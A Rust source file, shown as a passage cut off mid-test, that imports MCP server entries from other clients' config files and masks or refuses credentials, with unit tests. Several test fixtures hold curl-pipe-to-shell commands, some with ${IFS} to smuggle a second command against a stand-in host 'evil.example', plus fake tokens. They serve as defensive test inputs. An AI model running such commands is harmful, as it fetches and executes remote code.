//! Reading another client's MCP servers, for the first run to offer (since
//! step 25; `docs/architecture/08-configuration.md`, "Reading other tools'
//! set-up" and "First run").
//!
//! [`discover`](crate::discover) opens nothing. A file is read here only
//! when the person asks to see inside it: that is the import 08 says the
//! user asks for. What comes back holds **no literal value** of the file
//! beyond each server's command line or address:
//!
//! - **The environment's and the headers' values are dropped:** only their
//!   names are given. An imported server takes each from a variable the
//!   person sets ([`ImportedServer::header_variable`]).
//! - **The command line and the address are given whole, as shown,** each
//!   argument through the secret filter's formats and the address's user
//!   part through 08's rule. A part that matches is replaced by
//!   [`MASK`](cineris_base::redact::MASK) before it leaves this module, and
//!   the server is [`Refusal::HoldsCredential`]: it cannot be imported, as
//!   step 17 refuses an entry that holds one.
//! - **A name, a command or an address with a control character or a
//!   character that acts unseen** is [`Refusal::Unseen`], and is not
//!   imported either; nor is a name that cannot be a setting's
//!   ([`Refusal::Name`]: empty, or longer than [`MAX_NAME`]).
//!
//! **What is shown masks more than what refuses** (since the full review
//! of step 25's third pull request, [`ImportedServer::shown`]): a value
//! whose name says it is a credential is shown
//! [`MASK`](cineris_base::redact::MASK) in `NAME=value`, after such a flag
//! (`--api-key value`), and in an address's query (`?token=…`). Such a
//! server is still imported, as it is in its file: a name says nothing
//! certain of its value. [`ImportedServer::hidden`] says that what is shown
//! hides a part of what would be imported, so that the first run can say
//! so. **Every argument's bounds show:** one that is empty, or holds a
//! space or a `"`, is shown in double quotes, its `"` and `\` escaped.
//!
//! **Which names, and which values** (since the review of the fixes of the
//! third pull request, the coordinator's decision; the substring rule
//! before it hid `--author`'s value and a password command's whole line):
//!
//! - **A name says it is a credential's** when one of its words, split at
//!   `-`, `_`, `.` and where the case changes (`apiKey`), is or ends in one
//!   of [`SECRET_ENDINGS`] once its last digits are left off, or is one of
//!   [`SECRET_WORDS`]: `--api-key`, `GITHUB_TOKEN`, `PGPASSWORD`,
//!   `NGROK_AUTHTOKEN` and `API_KEY2` do; `--author`, `--keyboard`,
//!   `--tokenizer` and `PWD` do not. A name of `NAME=value` that holds white
//!   space (`mcp --key=…` inside a script) is not a name, and shows its
//!   value.
//! - **Never one that ends in** [`SHOWN_ENDINGS`] (`command`, `cmd`, `hook`,
//!   `script`, `file`, `path`, and since the coordinator's answers `url`,
//!   `uri`, `endpoint`, `dir` and `directory`): its value says where a
//!   credential comes from, or names a place, not the credential, and is
//!   shown (`--password-command …`, `--auth-hook=…`, `--auth-url https://…`,
//!   `--secrets-dir …`). Nor a switch turned off (`--no-auth`), which takes
//!   no value.
//! - **An address in an argument shows its host and path,** and what in it
//!   is a credential is masked as in a server's own address: its user part
//!   (as it is read, by 08's rule, which refuses the server) and a field of
//!   its query whose name says it is a credential's (`?api_key=…`), by the
//!   rules above.
//! - **Only a token is masked and imported:** ASCII letters and digits and
//!   `-._~+=:%@`, nothing else. **A path is a place, and is shown**
//!   (`--key ./client.key`, `--ssh-key ~/.ssh/id_ed25519`): it begins as a
//!   path does (`/`, `./`, `../`, `~/`, or a drive letter) and holds only a
//!   token's characters and path separators. A value under such a name
//!   that is neither (white space, a shell's metacharacter, a path
//!   separator elsewhere: `x;curl…|sh`, a base64 key with a `/`) is masked
//!   and its server refused ([`Refusal::NamedValue`]): it would be
//!   imported unseen, and a credential that is not a token belongs in a
//!   variable.
//!
//! The files read: `~/.claude.json`, Cursor's `~/.cursor/mcp.json` and
//! Claude Desktop's file (`mcpServers`, each server a `command` with
//! `args` and `env`, or a `url` with `headers`), and Codex's
//! `~/.codex/config.toml` (`[mcp_servers.<name>]` tables of the same
//! keys).

#![allow(
    clippy::disallowed_methods,
    clippy::disallowed_types,
    reason = "reads one file the person asked to see inside, on the setup's worker"
)]

use std::io::Read as _;
use std::path::Path;

use cineris_base::SecretFilter;

/// The most bytes of another client's file read: `~/.claude.json` keeps
/// that client's history too, and grows.
pub const MAX_FILE: u64 = 16 * 1024 * 1024;

/// The most servers given from one file.
pub const MAX_SERVERS: usize = 64;

/// The most characters of a server's name that can be imported: the
/// name is a key of the user's file, and names the server's tools.
pub const MAX_NAME: usize = 64;

/// What a word of a name whose value is taken for a credential is, or ends
/// in, once its last digits are left off: `GITHUB_TOKEN=…`, `--api-key …`,
/// `PGPASSWORD=…`, `NGROK_AUTHTOKEN=…`, `API_KEY2=…`.
pub const SECRET_ENDINGS: &[&str] = &[
    "key",
    "keys",
    "token",
    "tokens",
    "secret",
    "secrets",
    "password",
    "passwords",
    "passwd",
];

/// The words of a name whose value is taken for a credential, matched
/// whole: `--auth …`, `?auth=…` (not `--author`).
pub const SECRET_WORDS: &[&str] = &["auth", "authorization"];

/// The last words of a name whose value is never masked: it says where a
/// credential comes from, or names a place, not the credential
/// (`--password-command`, `--auth-hook`, `--token-file`, `--auth-url`,
/// `--secrets-dir`).
pub const SHOWN_ENDINGS: &[&str] = &[
    "command",
    "cmd",
    "hook",
    "script",
    "file",
    "path",
    "url",
    "dir",
    "uri",
    "endpoint",
    "directory",
];

/// The words of a name, in lower case: split at `-`, `_`, `.` and where the
/// case changes (`apiKey`, `APIKey`), each run of digits kept with the
/// letters before it.
fn words(name: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut word = String::new();
    let characters: Vec<char> = name.chars().collect();
    for (at, &character) in characters.iter().enumerate() {
        if matches!(character, '-' | '_' | '.') || !character.is_alphanumeric() {
            if !word.is_empty() {
                words.push(std::mem::take(&mut word));
            }
            continue;
        }
        let before = at.checked_sub(1).and_then(|at| characters.get(at));
        let after = characters.get(at + 1);
        // `aB`, and the `B` of `ABc`: a new word begins.
        let begins = character.is_uppercase()
            && before.is_some_and(|before| {
                before.is_lowercase()
                    || before.is_ascii_digit()
                    || (before.is_uppercase() && after.is_some_and(|after| after.is_lowercase()))
            });
        if begins && !word.is_empty() {
            words.push(std::mem::take(&mut word));
        }
        word.extend(character.to_lowercase());
    }
    if !word.is_empty() {
        words.push(word);
    }
    words
}

/// Whether `word`, in lower case, is a credential's: it is, or ends in,
/// one of [`SECRET_ENDINGS`] once its last digits are left off, or it is
/// one of [`SECRET_WORDS`].
fn a_credentials_word(word: &str) -> bool {
    let stem = word.trim_end_matches(|character: char| character.is_ascii_digit());
    SECRET_WORDS.contains(&word) || SECRET_ENDINGS.iter().any(|ending| stem.ends_with(ending))
}

/// Whether `name` says its value is a credential: it holds no white space,
/// a word of it is a credential's, its last is not one of
/// [`SHOWN_ENDINGS`], and it is not a switch turned off (`--no-auth`).
fn names_a_secret(name: &str) -> bool {
    if name.chars().any(char::is_whitespace) {
        return false;
    }
    let words = words(name);
    let Some(last) = words.last() else {
        return false;
    };
    if SHOWN_ENDINGS.contains(&last.as_str()) || words.first().is_some_and(|first| first == "no") {
        return false;
    }
    words.iter().any(|word| a_credentials_word(word))
}

/// Whether `character` can be in a token: an ASCII letter or digit, or one
/// of `-._~+=:%@`. Nothing a shell reads as more than a letter.
fn token_character(character: char) -> bool {
    character.is_ascii_alphanumeric()
        || matches!(
            character,
            '-' | '.' | '_' | '~' | '+' | '=' | ':' | '%' | '@'
        )
}

/// Whether `value` is a token: one or more of [`token_character`]'s.
fn token_shaped(value: &str) -> bool {
    !value.is_empty() && value.chars().all(token_character)
}

/// Whether `value` is a path, a place and not a secret (the coordinator's
/// answer): it begins as a path does (`/`, `./`, `../`, `~/`, their
/// Windows forms, or a drive letter), and holds only a token's characters
/// and path separators.
fn path_shaped(value: &str) -> bool {
    let bytes = value.as_bytes();
    let drive = bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && matches!(bytes[2], b'/' | b'\\');
    let begins = drive
        || ["/", "./", "../", "~/", ".\\", "..\\", "~\\"]
            .iter()
            .any(|start| value.starts_with(start));
    begins
        && value
            .chars()
            .all(|character| token_character(character) || matches!(character, '/' | '\\'))
}

/// How a value whose name says it is a credential is shown.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Masked {
    /// Nothing is masked.
    No,
    /// Masked, and imported as it is: a token.
    Token,
    /// Masked, and its server refused: neither a token nor a path.
    Loose,
}

impl Masked {
    /// What `value` under a name that says it is a credential is: a token,
    /// or not; nothing, and the mask itself (masked already by the
    /// formats), are neither, and are shown as they are.
    fn of(value: &str) -> Self {
        if value.is_empty() || value == cineris_base::redact::MASK {
            Self::No
        } else if token_shaped(value) {
            Self::Token
        } else if path_shaped(value) {
            // A place, shown (the coordinator's answer).
            Self::No
        } else {
            Self::Loose
        }
    }

    /// The more of the two.
    fn and(self, other: Self) -> Self {
        match (self, other) {
            (Self::Loose, _) | (_, Self::Loose) => Self::Loose,
            (Self::Token, _) | (_, Self::Token) => Self::Token,
            _ => Self::No,
        }
    }
}

/// Whether `name` can be a server's name in the user's file: one to
/// [`MAX_NAME`] characters, none a control character or one that acts
/// unseen.
#[must_use]
pub fn settable_name(name: &str) -> bool {
    !name.is_empty()
        && name.chars().count() <= MAX_NAME
        && !name.chars().any(cineris_base::acts_unseen)
}

/// `part` as an argument is shown: in double quotes, its `"` and `\`
/// escaped, when it is empty or holds white space or a `"`, so that where
/// each argument begins and ends shows.
fn quoted(part: &str) -> String {
    if !part.is_empty() && !part.chars().any(|c| c.is_whitespace() || c == '"') {
        return part.to_owned();
    }
    let mut shown = String::with_capacity(part.len() + 2);
    shown.push('"');
    for character in part.chars() {
        if matches!(character, '"' | '\\') {
            shown.push('\\');
        }
        shown.push(character);
    }
    shown.push('"');
    shown
}

/// `url` with the value of each query field whose name says it is a
/// credential masked, and what was.
fn masked_query(url: &str) -> (String, Masked) {
    let mask = cineris_base::redact::MASK;
    let Some((base, rest)) = url.split_once('?') else {
        return (url.to_owned(), Masked::No);
    };
    let (query, fragment) = match rest.split_once('#') {
        Some((query, fragment)) => (query, Some(fragment)),
        None => (rest, None),
    };
    let mut hidden = Masked::No;
    let fields: Vec<String> = query
        .split('&')
        .map(|field| match field.split_once('=') {
            Some((name, value)) if names_a_secret(name) && Masked::of(value) != Masked::No => {
                hidden = hidden.and(Masked::of(value));
                format!("{name}={mask}")
            }
            _ => field.to_owned(),
        })
        .collect();
    let mut shown = format!("{base}?{}", fields.join("&"));
    if let Some(fragment) = fragment {
        shown.push('#');
        shown.push_str(fragment);
    }
    (shown, hidden)
}

/// How a server is reached.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Launch {
    /// A program started with arguments, spoken to over standard I/O.
    Command {
        /// The program.
        program: String,
        /// Its arguments, each masked where it matched.
        args: Vec<String>,
    },
    /// A server at a web address.
    Remote {
        /// The address, its user part masked.
        url: String,
    },
}

/// Why a server cannot be imported.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Refusal {
    /// Its command line or its address holds a credential, now masked.
    HoldsCredential,
    /// Its name, command or address holds a control character or one
    /// that acts unseen.
    Unseen,
    /// Its name cannot be a setting's: empty, or longer than [`MAX_NAME`].
    Name,
    /// A value whose name says it is a credential is not a token (it holds
    /// white space or a path separator): it would be imported unseen, and
    /// belongs in a variable (since the review of the fixes of step 25's
    /// third pull request).
    NamedValue,
    /// It is neither a command nor an address this version reads.
    NotUnderstood,
}

/// One server of another client's file, with every literal value of its
/// environment and headers dropped.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ImportedServer {
    /// Its name in that file.
    pub name: String,
    /// How it is reached.
    pub launch: Launch,
    /// The names of the environment variables it is given.
    pub env: Vec<String>,
    /// The names of the headers it sends.
    pub headers: Vec<String>,
    /// Why it cannot be imported, if it cannot.
    pub refused: Option<Refusal>,
}

impl ImportedServer {
    /// The variable a header's value is taken from once imported: the
    /// server's name and the header's, in capitals, joined by `_`, each
    /// character that cannot be in a variable's name made `_`
    /// (`TRACKER_AUTHORIZATION`).
    #[must_use]
    pub fn header_variable(&self, header: &str) -> String {
        let name = format!("{}_{header}", self.name);
        name.chars()
            .map(|character| {
                if character.is_ascii_alphanumeric() {
                    character.to_ascii_uppercase()
                } else {
                    '_'
                }
            })
            .collect()
    }

    /// The command line or the address, as one text to show: each
    /// argument's bounds shown, and each value whose name says it is a
    /// credential masked (the [module documentation](self)).
    #[must_use]
    pub fn shown(&self) -> String {
        self.view().0
    }

    /// Whether [`shown`](Self::shown) masks a part that would be imported
    /// as it is in its file: what the person accepts is then not all on the
    /// screen, which the first run says.
    #[must_use]
    pub fn hidden(&self) -> bool {
        self.view().1 != Masked::No
    }

    fn view(&self) -> (String, Masked) {
        launch_view(&self.launch)
    }
}

/// `launch` as it is shown, and what of it is masked by a name.
fn launch_view(launch: &Launch) -> (String, Masked) {
    let mask = cineris_base::redact::MASK;
    match launch {
        Launch::Command { program, args } => {
            let mut hidden = Masked::No;
            let mut parts = vec![quoted(program)];
            // The value after a flag whose name says it is a credential.
            let mut after_flag = false;
            for arg in args {
                let shown = if after_flag && !arg.starts_with('-') && Masked::of(arg) != Masked::No
                {
                    hidden = hidden.and(Masked::of(arg));
                    mask.to_owned()
                } else if let Some((name, value)) = arg.split_once('=')
                    && names_a_secret(name)
                    && Masked::of(value) != Masked::No
                {
                    hidden = hidden.and(Masked::of(value));
                    format!("{name}={mask}")
                } else if arg.contains("://") {
                    // An address (`--auth-url https://…`): its host and path
                    // shown, and a credential in its query masked, as in a
                    // server's own address; its user part was masked as it
                    // was read.
                    let (shown, masked) = masked_query(arg);
                    hidden = hidden.and(masked);
                    shown
                } else {
                    arg.clone()
                };
                after_flag = arg.starts_with('-') && !arg.contains('=') && names_a_secret(arg);
                parts.push(quoted(&shown));
            }
            (parts.join(" "), hidden)
        }
        Launch::Remote { url } => masked_query(url),
    }
}

/// Why a file could not be read.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum ImportError {
    /// It could not be opened or read.
    #[error("it could not be read: {0}")]
    Unreadable(String),
    /// It is larger than [`MAX_FILE`].
    #[error("it is larger than {} MiB", MAX_FILE / 1024 / 1024)]
    TooLarge,
    /// It is not the JSON or TOML its tool writes.
    #[error("it is not the file this version knows: {0}")]
    NotUnderstood(String),
}

/// The servers of another client's file at `path`, read whole, values
/// dropped and masked as the [module documentation](self) says. A file
/// ending in `.toml` is Codex's, and any other JSON.
///
/// # Errors
///
/// [`ImportError`] when it cannot be read or is not understood.
pub fn read_servers(path: &Path) -> Result<Vec<ImportedServer>, ImportError> {
    read_servers_within(path, MAX_FILE)
}

/// [`read_servers`] with `limit` in [`MAX_FILE`]'s place, for its test.
fn read_servers_within(path: &Path, limit: u64) -> Result<Vec<ImportedServer>, ImportError> {
    let file =
        std::fs::File::open(path).map_err(|error| ImportError::Unreadable(error.to_string()))?;
    let mut text = String::new();
    file.take(limit + 1)
        .read_to_string(&mut text)
        .map_err(|error| ImportError::Unreadable(error.to_string()))?;
    if text.len() as u64 > limit {
        return Err(ImportError::TooLarge);
    }
    let toml = path
        .extension()
        .is_some_and(|extension| extension.eq_ignore_ascii_case("toml"));
    servers_in(&text, toml)
}

/// The servers of a file's `text`: TOML (`[mcp_servers.<name>]`) or JSON
/// (`mcpServers`).
///
/// # Errors
///
/// [`ImportError::NotUnderstood`] when it is neither.
pub fn servers_in(text: &str, toml: bool) -> Result<Vec<ImportedServer>, ImportError> {
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let value: serde_json::Value = if toml {
        let table: toml::Table = text.parse().map_err(|error: toml::de::Error| {
            ImportError::NotUnderstood(error.message().to_owned())
        })?;
        let table = table
            .get("mcp_servers")
            .cloned()
            .unwrap_or(toml::Value::Table(toml::Table::new()));
        serde_json::to_value(table)
            .map_err(|error| ImportError::NotUnderstood(error.to_string()))?
    } else {
        let value: serde_json::Value = serde_json::from_str(text)
            .map_err(|error| ImportError::NotUnderstood(format!("line {}", error.line())))?;
        value
            .get("mcpServers")
            .cloned()
            .unwrap_or(serde_json::Value::Object(serde_json::Map::new()))
    };
    let serde_json::Value::Object(servers) = value else {
        return Err(ImportError::NotUnderstood(
            "its servers are not a table of names".to_owned(),
        ));
    };
    let filter = SecretFilter::new();
    Ok(servers
        .iter()
        .take(MAX_SERVERS)
        .map(|(name, entry)| server(&filter, name, entry))
        .collect())
}

fn server(filter: &SecretFilter, name: &str, entry: &serde_json::Value) -> ImportedServer {
    let text = |key: &str| entry.get(key).and_then(serde_json::Value::as_str);
    let names = |key: &str| -> Vec<String> {
        entry
            .get(key)
            .and_then(serde_json::Value::as_object)
            .map(|table| table.keys().cloned().collect())
            .unwrap_or_default()
    };
    let mut masked = false;
    let mut mask = |part: &str| -> String {
        let shown = filter.redact(part);
        let shown =
            crate::schema::redact::without_url_users(&shown).unwrap_or_else(|| shown.into_owned());
        masked |= shown != part;
        shown
    };
    let launch = match (text("command"), text("url")) {
        (Some(program), _) => {
            let args = entry
                .get("args")
                .and_then(serde_json::Value::as_array)
                .map(|args| {
                    args.iter()
                        .map(|arg| match arg {
                            serde_json::Value::String(arg) => arg.clone(),
                            other => other.to_string(),
                        })
                        .collect::<Vec<_>>()
                })
                .unwrap_or_default();
            Some(Launch::Command {
                program: mask(program),
                args: args.iter().map(|arg| mask(arg)).collect(),
            })
        }
        (None, Some(url)) => Some(Launch::Remote { url: mask(url) }),
        (None, None) => None,
    };
    let env = names("env");
    let headers = names("headers");
    let Some(launch) = launch else {
        return ImportedServer {
            name: name.to_owned(),
            launch: Launch::Command {
                program: String::new(),
                args: Vec::new(),
            },
            env,
            headers,
            refused: Some(Refusal::NotUnderstood),
        };
    };
    let mut server = ImportedServer {
        name: name.to_owned(),
        launch,
        env,
        headers,
        refused: None,
    };
    let unseen = |text: &str| text.chars().any(cineris_base::acts_unseen);
    let names_unseen = server
        .env
        .iter()
        .chain(&server.headers)
        .any(|name| unseen(name) || name.is_empty());
    let launch_unseen = match &server.launch {
        Launch::Command { program, args } => unseen(program) || args.iter().any(|arg| unseen(arg)),
        Launch::Remote { url } => unseen(url),
    };
    server.refused = if unseen(&server.name) || launch_unseen || names_unseen {
        Some(Refusal::Unseen)
    } else if !settable_name(&server.name) {
        Some(Refusal::Name)
    } else if masked {
        Some(Refusal::HoldsCredential)
    } else if launch_view(&server.launch).1 == Masked::Loose {
        Some(Refusal::NamedValue)
    } else {
        None
    };
    server
}

#[cfg(test)]
mod tests {
    use cineris_base::redact::MASK;

    use super::*;

    const CLAUDE: &str = r#"{
      "numStartups": 4,
      "mcpServers": {
        "docs": {"type": "stdio", "command": "npx", "args": ["-y", "@example/docs-mcp", "--root", "~/src/docs"],
                 "env": {"DOCS_TOKEN": "dt_live_0123456789abcdef"}},
        "tracker": {"type": "http", "url": "https://tracker.example.com/mcp",
                    "headers": {"Authorization": "Bearer tk_9f8e7d6c5b4a39281706"}},
        "github": {"command": "docker", "args": ["run", "-i", "--rm", "-e",
                   "GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789", "ghcr.io/example/github-mcp:1.4"]},
        "proxy": {"url": "https://user:hunter2hunter2@proxy.example.com/mcp"},
        "odd\u202e": {"command": "x"},
        "nothing": {"type": "stdio"}
      },
      "projects": {"/work/x": {"mcpServers": {"inner": {"command": "y"}}}}
    }"#;

    fn by_name<'a>(servers: &'a [ImportedServer], name: &str) -> &'a ImportedServer {
        servers.iter().find(|server| server.name == name).unwrap()
    }

    #[test]
    fn values_are_dropped_and_names_kept() {
        let servers = servers_in(CLAUDE, false).unwrap();
        assert_eq!(servers.len(), 6, "the user's servers, not a project's");
        let docs = by_name(&servers, "docs");
        assert_eq!(docs.shown(), "npx -y @example/docs-mcp --root ~/src/docs");
        assert_eq!(docs.env, ["DOCS_TOKEN"]);
        assert_eq!(docs.refused, None);
        let tracker = by_name(&servers, "tracker");
        assert_eq!(tracker.shown(), "https://tracker.example.com/mcp");
        assert_eq!(tracker.headers, ["Authorization"]);
        assert_eq!(
            tracker.header_variable("Authorization"),
            "TRACKER_AUTHORIZATION"
        );
        assert_eq!(tracker.refused, None);
        let debug = format!("{servers:?}");
        for value in ["dt_live", "tk_9f8e", "ghp_abc", "hunter2"] {
            assert!(!debug.contains(value), "{value} left the reader: {debug}");
        }
    }

    #[test]
    fn a_credential_in_a_command_or_an_address_is_masked_and_refused() {
        let servers = servers_in(CLAUDE, false).unwrap();
        let github = by_name(&servers, "github");
        assert_eq!(
            github.shown(),
            format!("docker run -i --rm -e GITHUB_TOKEN={MASK} ghcr.io/example/github-mcp:1.4")
        );
        assert_eq!(github.refused, Some(Refusal::HoldsCredential));
        let proxy = by_name(&servers, "proxy");
        assert_eq!(
            proxy.shown(),
            format!("https://{MASK}@proxy.example.com/mcp")
        );
        assert_eq!(proxy.refused, Some(Refusal::HoldsCredential));
        assert_eq!(
            by_name(&servers, "odd\u{202e}").refused,
            Some(Refusal::Unseen)
        );
        assert_eq!(
            by_name(&servers, "nothing").refused,
            Some(Refusal::NotUnderstood)
        );
    }

    #[test]
    fn codex_s_toml_and_files_that_are_not_understood() {
        let servers = servers_in(
            "model = \"x\"\n[mcp_servers.search]\ncommand = \"search-mcp\"\nargs = [\"--fast\"]\nenv = { KEY = \"v_0123456789abcdefghij\" }\n",
            true,
        )
        .unwrap();
        assert_eq!(servers.len(), 1);
        assert_eq!(servers[0].shown(), "search-mcp --fast");
        assert_eq!(servers[0].env, ["KEY"]);
        assert!(servers_in("{", false).is_err());
        assert!(servers_in("[[", true).is_err());
        assert!(servers_in("{\"mcpServers\": [1]}", false).is_err());
        assert_eq!(servers_in("{}", false).unwrap(), Vec::new());
    }

    /// A value whose name says it is a credential is shown masked (in
    /// `NAME=value`, after such a flag, in an address's query) and the
    /// server is still imported, as it is in its file, which `hidden` says;
    /// a flag of that name followed by another flag masks nothing (the full
    /// review of the third pull request).
    #[test]
    fn a_value_named_as_a_credential_is_shown_masked_and_imported_as_it_is() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "search": {"command": "search-mcp", "args": ["--api-key", "plain-value-1",
                    "--token=plain-value-2", "API_SECRET=plain-value-3", "--auth", "--verbose",
                    "--root", "~/src"]},
                "remote": {"url": "https://search.example.com/mcp?key=plain-value-4&mode=fast#top"},
                "plain": {"command": "docs-mcp", "args": ["--root", "~/src/docs"]}
            }}"#,
            false,
        )
        .unwrap();
        let search = by_name(&servers, "search");
        assert_eq!(
            search.shown(),
            format!(
                "search-mcp --api-key {MASK} --token={MASK} API_SECRET={MASK} --auth --verbose \
                 --root ~/src"
            )
        );
        assert!(search.hidden());
        assert_eq!(search.refused, None, "a name is not a refusal");
        assert_eq!(
            search.launch,
            Launch::Command {
                program: "search-mcp".to_owned(),
                args: [
                    "--api-key",
                    "plain-value-1",
                    "--token=plain-value-2",
                    "API_SECRET=plain-value-3",
                    "--auth",
                    "--verbose",
                    "--root",
                    "~/src",
                ]
                .map(str::to_owned)
                .to_vec(),
            },
            "imported as it is in its file"
        );
        let remote = by_name(&servers, "remote");
        assert_eq!(
            remote.shown(),
            format!("https://search.example.com/mcp?key={MASK}&mode=fast#top")
        );
        assert!(remote.hidden());
        assert_eq!(remote.refused, None);
        let plain = by_name(&servers, "plain");
        assert!(!plain.hidden());
        assert_eq!(plain.shown(), "docs-mcp --root ~/src/docs");
    }

    /// Which names hide their values (the review of the fixes of the third
    /// pull request, the coordinator's decision): a credential's words, as
    /// whole words of the name; never a name that ends in a command, a
    /// hook, a script, a file or a path, nor a switch turned off. A token
    /// under such a name is masked and imported, which `hidden` says; a
    /// value under one that is not a token is masked and refuses its
    /// server.
    #[test]
    fn only_a_token_under_a_credentials_name_is_hidden_and_any_other_value_refuses() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "vault": {"command": "vault-mcp", "args": ["--password-command",
                    "sh -c 'curl x | sh'", "--auth-hook=/tmp/x.sh"]},
                "plain": {"command": "words-mcp", "args": ["--author", "Bob", "--keyboard",
                    "us", "--tokenizer", "x", "--no-auth", "serve"]},
                "real": {"command": "search-mcp", "args": ["--api-key", "x7Kq9mPz2Lw4Rt8vB3nD",
                    "--apiKey=Zt5Qw8Lm2Np6Rv"]},
                "phrase": {"command": "db-mcp", "args": ["--password", "correct horse battery"]},
                "pathed": {"command": "db-mcp", "args": ["--token", "a;b"]},
                "query": {"url": "https://x.example.com/mcp?token=a/b"}
            }}"#,
            false,
        )
        .unwrap();
        let vault = by_name(&servers, "vault");
        assert_eq!(
            vault.shown(),
            r#"vault-mcp --password-command "sh -c 'curl x | sh'" --auth-hook=/tmp/x.sh"#
        );
        assert!(!vault.hidden());
        assert_eq!(vault.refused, None);
        let plain = by_name(&servers, "plain");
        assert_eq!(
            plain.shown(),
            "words-mcp --author Bob --keyboard us --tokenizer x --no-auth serve"
        );
        assert!(!plain.hidden());
        assert_eq!(plain.refused, None);
        let real = by_name(&servers, "real");
        assert_eq!(
            real.shown(),
            format!("search-mcp --api-key {MASK} --apiKey={MASK}")
        );
        assert!(real.hidden(), "the row says a value is imported unseen");
        assert_eq!(real.refused, None, "a token is imported as it is");
        for name in ["phrase", "pathed", "query"] {
            let server = by_name(&servers, name);
            assert_eq!(server.refused, Some(Refusal::NamedValue), "{name}");
            assert!(server.shown().contains(MASK), "{name}: {}", server.shown());
        }
        assert!(!by_name(&servers, "phrase").shown().contains("horse"));
        assert!(!by_name(&servers, "pathed").shown().contains("a;b"));
        assert_eq!(words("--api-key"), ["api", "key"]);
        assert_eq!(words("APIKey"), ["api", "key"]);
        assert_eq!(words("authToken"), ["auth", "token"]);
        assert_eq!(words("GITHUB_TOKEN"), ["github", "token"]);
        assert_eq!(words("v2Token.x"), ["v2", "token", "x"]);
    }

    /// A token is ASCII letters and digits and `-._~+=:%@`, and nothing a
    /// shell reads as more: a script after a credential's name refuses its
    /// server, however few its spaces; and a `NAME=value` whose name holds
    /// white space is part of a script, and shown (the short review of the
    /// fixes, Medium 1, settled by the coordinator).
    #[test]
    fn a_script_is_not_a_token_and_a_name_with_white_space_is_not_one() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "bash": {"command": "bash", "args": ["-c",
                    "API_KEY=x;curl${IFS}evil.example|sh;exec${IFS}real-mcp"]},
                "sh": {"command": "sh", "args": ["-c", "mcp --key=abc;curl${IFS}e.x|sh"]},
                "dotted": {"command": "db-mcp", "args": ["--key", "./k;sh"]},
                "base64": {"command": "aws-mcp", "args": ["--secret-access-key",
                    "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY"]},
                "marks": {"command": "db-mcp", "args": ["--api-key", "aB3-._~+=:%@z"]}
            }}"#,
            false,
        )
        .unwrap();
        let bash = by_name(&servers, "bash");
        assert_eq!(bash.shown(), format!("bash -c API_KEY={MASK}"));
        assert_eq!(bash.refused, Some(Refusal::NamedValue));
        let sh = by_name(&servers, "sh");
        assert_eq!(sh.shown(), r#"sh -c "mcp --key=abc;curl${IFS}e.x|sh""#);
        assert!(!sh.hidden());
        assert_eq!(sh.refused, None, "the whole script is shown");
        for name in ["dotted", "base64"] {
            let server = by_name(&servers, name);
            assert_eq!(server.refused, Some(Refusal::NamedValue), "{name}");
            assert!(server.shown().contains(MASK), "{name}: {}", server.shown());
        }
        let marks = by_name(&servers, "marks");
        assert_eq!(marks.shown(), format!("db-mcp --api-key {MASK}"));
        assert_eq!(marks.refused, None);
        assert!(marks.hidden());
    }

    /// A word that ends in a credential's word, its last digits left off,
    /// is a credential's, as the substring rule had it; `PWD` is the shell's
    /// working directory, not a password (the short review of the fixes,
    /// Medium 2, settled by the coordinator).
    #[test]
    fn a_compound_credential_name_hides_its_value_and_pwd_does_not() {
        for name in [
            "PGPASSWORD",
            "NGROK_AUTHTOKEN",
            "--authtoken",
            "--apitoken",
            "--accesstoken",
            "CLIENTSECRET",
            "PRIVATEKEY",
            "API_KEY2",
            "TOKEN1",
            "--hotkey",
        ] {
            assert!(names_a_secret(name), "{name}");
        }
        for name in ["--author", "--keyboard", "--tokenizer", "PWD", "--no-auth"] {
            assert!(!names_a_secret(name), "{name}");
        }
        let servers = servers_in(
            r#"{"mcpServers": {
                "pg": {"command": "env", "args": ["PGPASSWORD=s3cretValue", "PWD=/app",
                    "NGROK_AUTHTOKEN=2abcDEF", "KEY2=v4lue", "pg-mcp"]}
            }}"#,
            false,
        )
        .unwrap();
        assert_eq!(
            servers[0].shown(),
            format!("env PGPASSWORD={MASK} PWD=/app NGROK_AUTHTOKEN={MASK} KEY2={MASK} pg-mcp")
        );
        assert_eq!(servers[0].refused, None);
    }

    /// A name that ends in `url` or `dir` names a place, and its value is
    /// shown (settled by the coordinator, after the review of the fixes):
    /// an address's host and path show, and its user part and a credential
    /// in its query are masked; a user part still refuses its server, by
    /// 08's rule.
    #[test]
    fn a_place_named_by_url_or_dir_is_shown_with_its_credentials_masked() {
        let token = "x7Kq9mPz2Lw4Rt8vB3nD";
        let servers = servers_in(
            &format!(
                r#"{{"mcpServers": {{
                    "login": {{"command": "auth-mcp", "args": ["--auth-url",
                        "https://u:p@auth.example.com/login?api_key={token}"]}},
                    "open": {{"command": "auth-mcp", "args": [
                        "--auth-url=https://auth.example.com/login?api_key={token}&mode=fast",
                        "--secrets-dir", "/run/secrets"]}},
                    "places": {{"command": "tls-mcp", "args": ["--token-uri", "https://t.example.com/a",
                        "--token-endpoint", "https://t.example.com/b", "--secrets-directory", "/run/s x",
                        "--key", "./client.key", "--ssh-key", "~/.ssh/id_ed25519",
                        "--key-store", "C:\\keys\\client.key", "--cert-key", "../k"]}}
                }}}}"#
            ),
            false,
        )
        .unwrap();
        let login = by_name(&servers, "login");
        assert_eq!(
            login.shown(),
            format!("auth-mcp --auth-url https://{MASK}@auth.example.com/login?api_key={MASK}")
        );
        assert_eq!(login.refused, Some(Refusal::HoldsCredential));
        let open = by_name(&servers, "open");
        assert_eq!(
            open.shown(),
            format!(
                "auth-mcp --auth-url=https://auth.example.com/login?api_key={MASK}&mode=fast \
                 --secrets-dir /run/secrets"
            )
        );
        assert!(open.hidden(), "the row says a value is imported unseen");
